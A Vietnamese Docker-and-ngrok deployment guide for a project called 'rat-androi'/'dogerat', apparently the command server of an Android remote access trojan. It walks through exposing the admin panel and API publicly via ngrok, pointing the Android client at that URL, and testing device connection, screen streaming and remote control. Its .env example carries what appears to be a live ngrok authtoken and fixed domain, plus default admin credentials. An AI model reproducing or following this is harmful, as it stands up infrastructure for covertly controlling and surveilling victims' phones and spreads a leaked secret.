# HƯỚNG DẪN DEPLOYMENT VỚI DOCKER VÀ NGROK

## 📦 1. CHUẨN BỊ MÔI TRƯỜNG

### 1.1. Yêu cầu hệ thống

**Phần mềm cần cài đặt:**

- Docker Engine 20.x+
- Docker Compose 2.x+
- Git
- (Optional) Node.js 18+ cho development

**Tài nguyên tối thiểu:**

- CPU: 2 cores
- RAM: 4GB
- Disk: 10GB free space
- Network: Internet connection với public IP hoặc ngrok

### 1.2. Clone Repository

```bash
git clone https://github.com/hoanganh-hue/rat-androi.git
cd rat-androi
```

---

## 🔧 2. CẤU HÌNH

### 2.1. Tạo File Environment

```bash
# Copy file mẫu
cp .env.example .env

# Chỉnh sửa .env với editor
nano .env
```

### 2.2. Cấu hình quan trọng

**File: `.env`**

```env
# Database
DATABASE_URL=postgresql://dogerat:StrongPassword123@postgres:5432/dogerat
DB_TYPE=postgres
DB_NAME=dogerat
DB_USER=dogerat
DB_PASSWORD=StrongPassword123

# Security
JWT_SECRET=your-super-secret-random-key-min-32-chars
ADMIN_PASSWORD=AdminStrongPass@2025

# Ngrok
NGROK_AUTHTOKEN=349egkHrIWSE7NzXDFCEnw9ulph_5PtSyXrWpJDq4tJHWhzFu
NGROK_FIXED_DOMAIN=evelina-duchesslike-solely.ngrok-free.dev

# Production
NODE_ENV=production
CORS_ORIGIN=https://evelina-duchesslike-solely.ngrok-free.dev
```

**⚠️ LƯU Ý BẢO MẬT:**

1. Thay đổi `JWT_SECRET` bằng chuỗi random mạnh
2. Thay đổi `ADMIN_PASSWORD` ngay sau lần đăng nhập đầu tiên
3. Sử dụng password mạnh cho database
4. KHÔNG commit file `.env` vào Git

### 2.3. Generate JWT Secret mạnh

```bash
# Linux/macOS
openssl rand -base64 64

# Windows (PowerShell)
[Convert]::ToBase64String((1..64|ForEach-Object{Get-Random -Maximum 256}))
```

---

## 🐳 3. DEPLOYMENT VỚI DOCKER

### 3.1. Build Images

```bash
# Build tất cả services
docker-compose build

# Hoặc build từng service
docker-compose build postgres
docker-compose build server
docker-compose build client
docker-compose build ngrok
```

### 3.2. Start Services

```bash
# Start tất cả services
docker-compose up -d

# Xem logs
docker-compose logs -f

# Xem logs của service cụ thể
docker-compose logs -f server
docker-compose logs -f ngrok
```

### 3.3. Initialize Database

```bash
# Run migrations
docker-compose exec server npm run db:migrate

# Create admin user
docker-compose exec server npm run db:seed

# (Optional) Verify database
docker-compose exec postgres psql -U dogerat -d dogerat -c "\dt"
```

### 3.4. Verify Deployment

**Check services status:**

```bash
docker-compose ps
```

**Expected output:**

```
NAME               STATUS      PORTS
dogerat-db         Up         5432/tcp
dogerat-server     Up         0.0.0.0:5000->5000/tcp
dogerat-client     Up         0.0.0.0:80->80/tcp
dogerat-ngrok      Up         0.0.0.0:4040->4040/tcp
```

**Health checks:**

```bash
# Backend health
curl http://localhost:5000/api/health

# Frontend
curl http://localhost/

# Ngrok status
curl http://localhost:4040/api/tunnels
```

---

## 🌐 4. NGROK CONFIGURATION

### 4.1. Ngrok Dashboard

Truy cập ngrok web interface:

```
http://localhost:4040
```

Bạn sẽ thấy:

- Tunnel URL: `https://evelina-duchesslike-solely.ngrok-free.dev`
- Request logs
- Traffic statistics

### 4.2. Test Remote Access

```bash
# Test từ máy khác hoặc Internet
curl https://evelina-duchesslike-solely.ngrok-free.dev/api/health

# Expected response
{
  "status": "ok",
  "timestamp": "2025-10-21T05:00:00.000Z",
  "environment": "production"
}
```

### 4.3. Configure Android Client

**Trong Android app, set server URL:**

```
https://evelina-duchesslike-solely.ngrok-free.dev
```

### 4.4. Ngrok Regions

Nếu cần thay đổi region để giảm latency:

```yaml
# docker-compose.yml
ngrok:
  command: http --url=evelina-duchesslike-solely.ngrok-free.dev --region=ap server:5000
```

**Available regions:**

- `us` - United States (default)
- `eu` - Europe
- `ap` - Asia/Pacific
- `au` - Australia
- `sa` - South America
- `jp` - Japan
- `in` - India

---

## 📱 5. TRUY CẬP ỨNG DỤNG

### 5.1. Local Access

**Web Admin:**

```
http://localhost
```

**Backend API:**

```
http://localhost:5000
```

**API Documentation:**

```
http://localhost:5000/api-docs
```

### 5.2. Remote Access (qua Ngrok)

**Web Admin & API:**

```
https://evelina-duchesslike-solely.ngrok-free.dev
```

**API Documentation:**

```
https://evelina-duchesslike-solely.ngrok-free.dev/api-docs
```

### 5.3. Default Login

```
Username: admin
Password: Admin@123456 (hoặc giá trị trong .env)
```

**⚠️ ĐỔI MẬT KHẨU NGAY SAU KHI ĐĂNG NHẬP!**

---

## 🔄 6. QUẢN LÝ VÀ BẢO TRÌ

### 6.1. Stop Services

```bash
# Stop tất cả
docker-compose stop

# Stop service cụ thể
docker-compose stop server
```

### 6.2. Restart Services

```bash
# Restart tất cả
docker-compose restart

# Restart service cụ thể
docker-compose restart server
```

### 6.3. View Logs

```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f server

# Last 100 lines
docker-compose logs --tail=100 server

# Since timestamp
docker-compose logs --since 2025-10-21T00:00:00 server
```

### 6.4. Update Application

```bash
# Pull latest code
git pull origin main

# Rebuild images
docker-compose build

# Restart with new images
docker-compose up -d

# Run migrations if needed
docker-compose exec server npm run db:migrate
```

### 6.5. Backup Database

```bash
# Backup to file
docker-compose exec postgres pg_dump -U dogerat dogerat > backup_$(date +%Y%m%d_%H%M%S).sql

# Restore from file
docker-compose exec -T postgres psql -U dogerat dogerat < backup_20251021_120000.sql
```

### 6.6. Clean Up

```bash
# Stop and remove containers
docker-compose down

# Remove containers and volumes (⚠️ DELETES DATA)
docker-compose down -v

# Remove images
docker-compose down --rmi all
```

---

## 🔒 7. BẢO MẬT

### 7.1. Firewall Configuration

**Allow only necessary ports:**

```bash
# Ubuntu/Debian
sudo ufw allow 80/tcp
sudo ufw allow 5000/tcp
sudo ufw enable

# CentOS/RHEL
sudo firewall-cmd --permanent --add-port=80/tcp
sudo firewall-cmd --permanent --add-port=5000/tcp
sudo firewall-cmd --reload
```

### 7.2. SSL/TLS Certificate (Optional)

Nếu không dùng ngrok, setup SSL với Let's Encrypt:

```bash
# Install certbot
sudo apt install certbot python3-certbot-nginx

# Get certificate
sudo certbot --nginx -d yourdomain.com

# Auto-renewal
sudo certbot renew --dry-run
```

### 7.3. Security Headers

Đã được cấu hình trong Helmet middleware:

- X-Content-Type-Options
- X-Frame-Options
- X-XSS-Protection
- Strict-Transport-Security

### 7.4. Rate Limiting

Đã được cấu hình:

- 100 requests / 15 minutes per IP
- Áp dụng cho tất cả `/api/*` endpoints

---

## 📊 8. MONITORING

### 8.1. Health Checks

Docker Compose đã cấu hình health checks tự động:

```yaml
healthcheck:
  test:
    [
      "CMD",
      "node",
      "-e",
      "require('http').get('http://localhost:5000/api/health', ...)",
    ]
  interval: 30s
  timeout: 10s
  retries: 3
```

### 8.2. Resource Usage

```bash
# Container stats
docker stats

# Specific container
docker stats dogerat-server

# Disk usage
docker system df
```

### 8.3. Application Logs

**Log files location:**

```
./logs/server.log
./logs/server-error.log
```

**View logs:**

```bash
tail -f logs/server.log
```

---

## 🐛 9. TROUBLESHOOTING

### 9.1. Service không start

```bash
# Check logs
docker-compose logs server

# Check if ports are in use
sudo netstat -tulpn | grep :5000
sudo netstat -tulpn | grep :80

# Kill process using port
sudo kill -9 $(lsof -t -i:5000)
```

### 9.2. Database connection errors

```bash
# Check database status
docker-compose ps postgres

# Check database logs
docker-compose logs postgres

# Test connection
docker-compose exec postgres psql -U dogerat -c "SELECT 1"

# Reset database (⚠️ DELETES DATA)
docker-compose down -v
docker-compose up -d
docker-compose exec server npm run db:setup
```

### 9.3. Ngrok không hoạt động

```bash
# Check ngrok logs
docker-compose logs ngrok

# Verify authtoken
docker-compose exec ngrok ngrok config check

# Restart ngrok
docker-compose restart ngrok

# Check ngrok status
curl http://localhost:4040/api/tunnels
```

### 9.4. Out of Memory

```bash
# Check memory usage
docker stats

# Increase container memory limit
# Edit docker-compose.yml:
services:
  server:
    mem_limit: 2g
    mem_reservation: 1g
```

### 9.5. Disk Space Issues

```bash
# Clean up Docker
docker system prune -a

# Remove old images
docker image prune -a

# Remove stopped containers
docker container prune

# Remove unused volumes
docker volume prune
```

---

## 🚀 10. PRODUCTION CHECKLIST

**Trước khi deploy production:**

- [ ] Thay đổi `JWT_SECRET` bằng chuỗi random mạnh
- [ ] Thay đổi `ADMIN_PASSWORD` mạnh
- [ ] Sử dụng password mạnh cho database
- [ ] Set `NODE_ENV=production`
- [ ] Configure specific `CORS_ORIGIN` (không dùng `*`)
- [ ] Enable database SSL connection
- [ ] Setup firewall rules
- [ ] Configure log rotation
- [ ] Setup automated backups
- [ ] Test all endpoints
- [ ] Test device connection
- [ ] Test screen streaming
- [ ] Test remote control
- [ ] Monitor resource usage
- [ ] Document access credentials (securely)

---

## 📞 11. HỖ TRỢ

**Nếu gặp vấn đề:**

1. Check logs: `docker-compose logs -f`
2. Verify services: `docker-compose ps`
3. Test health: `curl http://localhost:5000/api/health`
4. Review documentation trong `docs/`
5. Check issues trên GitHub

---

## 📈 12. PERFORMANCE TUNING

### 12.1. Database Optimization

```bash
# Increase shared_buffers
# Edit docker-compose.yml:
postgres:
  command: postgres -c shared_buffers=256MB -c max_connections=200
```

### 12.2. Node.js Optimization

```bash
# Use production mode
NODE_ENV=production

# Enable clustering (edit server/index.ts)
# Use PM2 for process management
```

### 12.3. Nginx Caching

```nginx
# Add to nginx.conf
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=STATIC:10m inactive=7d use_temp_path=off;

location / {
  proxy_cache STATIC;
  proxy_cache_valid 200 7d;
}
```

---

**Document Version**: 1.0  
**Last Updated**: 21/10/2025  
**Status**: Production Ready
